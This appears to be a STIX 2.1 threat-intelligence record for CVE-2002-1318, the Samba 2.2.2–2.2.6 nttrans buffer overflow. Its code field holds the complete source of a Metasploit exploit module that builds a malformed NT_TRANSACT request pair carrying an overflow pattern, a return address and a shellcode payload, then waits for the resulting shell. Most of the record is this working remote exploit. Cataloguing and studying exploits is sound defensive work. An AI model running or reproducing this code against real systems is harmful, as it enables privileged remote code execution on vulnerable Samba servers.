{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3506a0fa-951e-46fa-8df4-56ef0c7041be",
    "created": "2024-08-14T17:04:54.859285Z",
    "modified": "2024-08-14T17:04:54.859289Z",
    "name": "Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow",
    "description": " This module attempts to exploit a buffer overflow vulnerability present in versions 2.2.2 through 2.2.6 of Samba.  The Samba developers report this as: \"Bug in the length checking for encrypted password change requests from clients.\"  The bug was discovered and reported by the Debian Samba Maintainers. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/samba/nttrans.rb",
            "external_id": "nttrans.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2002-1318"
        },
        {
            "source_name": "reference",
            "url": "http://www.samba.org/samba/history/samba-2.2.7a.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::SMB::Client\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow',\n      'Description'    => %q{\n          This module attempts to exploit a buffer overflow vulnerability present in\n        versions 2.2.2 through 2.2.6 of Samba.\n\n        The Samba developers report this as:\n        \"Bug in the length checking for encrypted password change requests from clients.\"\n\n        The bug was discovered and reported by the Debian Samba Maintainers.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2002-1318' ],\n          [ 'OSVDB', '14525' ],\n          [ 'BID', '6210' ],\n          [ 'URL', 'http://www.samba.org/samba/history/samba-2.2.7a.html' ]\n        ],\n      'Privileged'     => true,\n      'Platform'       => 'linux',\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\",\n          'MinNops'  => 512,\n        },\n      'Targets'        =>\n        [\n          [ \"Samba 2.2.x Linux x86\",\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'linux',\n              'Rets' => [0x01020304, 0x41424344],\n            },\n          ],\n        ],\n      'DisclosureDate' => '2003-04-07'\n      ))\n\n    register_options(\n      [\n        Opt::RPORT(139)\n      ])\n\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n  def exploit\n\n    # 0x081fc968\n\n    pattern = Rex::Text.pattern_create(12000)\n\n    pattern[532, 4] = [0x81b847c].pack('V')\n    pattern[836, payload.encoded.length] = payload.encoded\n\n    # 0x081b8138\n\n    connect(versions: [1])\n    smb_login\n\n    targ_address = 0xfffbb7d0\n\n    #\n    # Send a NTTrans request with ParameterCountTotal set to the buffer length\n    #\n\n    subcommand   = 1\n    param        = ''\n    body         = ''\n    setup_count  = 0\n    setup_data   = ''\n    data = param + body\n\n    pkt = CONST::SMB_NTTRANS_PKT.make_struct\n    self.simple.client.smb_defaults(pkt['Payload']['SMB'])\n\n    base_offset = pkt.to_s.length + (setup_count * 2) - 4\n    param_offset = base_offset\n    data_offset = param_offset + param.length\n\n    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_NT_TRANSACT\n    pkt['Payload']['SMB'].v['Flags1'] = 0x18\n    pkt['Payload']['SMB'].v['Flags2'] = 0x2001\n    pkt['Payload']['SMB'].v['WordCount'] = 19 + setup_count\n\n    pkt['Payload'].v['ParamCountTotal'] =12000\n    pkt['Payload'].v['DataCountTotal'] = body.length\n    pkt['Payload'].v['ParamCountMax'] = 1024\n    pkt['Payload'].v['DataCountMax'] = 65504\n    pkt['Payload'].v['ParamCount'] = param.length\n    pkt['Payload'].v['ParamOffset'] = param_offset\n    pkt['Payload'].v['DataCount'] = body.length\n    pkt['Payload'].v['DataOffset'] = data_offset\n    pkt['Payload'].v['SetupCount'] = setup_count\n    pkt['Payload'].v['SetupData'] = setup_data\n    pkt['Payload'].v['Subcommand'] = subcommand\n\n    pkt['Payload'].v['Payload'] = data\n\n    self.simple.client.smb_send(pkt.to_s)\n    ack = self.simple.client.smb_recv_parse(CONST::SMB_COM_NT_TRANSACT)\n\n    #\n    # Send a NTTrans secondary request with the magic displacement\n    #\n\n    param = pattern\n    body  = ''\n    data  = param + body\n\n    pkt = CONST::SMB_NTTRANS_SECONDARY_PKT.make_struct\n    self.simple.client.smb_defaults(pkt['Payload']['SMB'])\n\n    base_offset = pkt.to_s.length - 4\n    param_offset = base_offset\n    data_offset = param_offset + param.length\n\n    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_NT_TRANSACT_SECONDARY\n    pkt['Payload']['SMB'].v['Flags1'] = 0x18\n    pkt['Payload']['SMB'].v['Flags2'] = 0x2001\n    pkt['Payload']['SMB'].v['WordCount'] = 18\n\n    pkt['Payload'].v['ParamCountTotal'] = param.length\n    pkt['Payload'].v['DataCountTotal'] = body.length\n    pkt['Payload'].v['ParamCount'] = param.length\n    pkt['Payload'].v['ParamOffset'] = param_offset\n    pkt['Payload'].v['ParamDisplace'] = targ_address\n    pkt['Payload'].v['DataCount'] = body.length\n    pkt['Payload'].v['DataOffset'] = data_offset\n\n    pkt['Payload'].v['Payload'] = data\n\n    self.simple.client.smb_send(pkt.to_s)\n    ack = self.simple.client.smb_recv_parse(CONST::SMB_COM_NT_TRANSACT_SECONDARY)\n\n\n    handler\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2003-04-07",
    "x_mitre_platforms": [
        "linux'"
    ]
}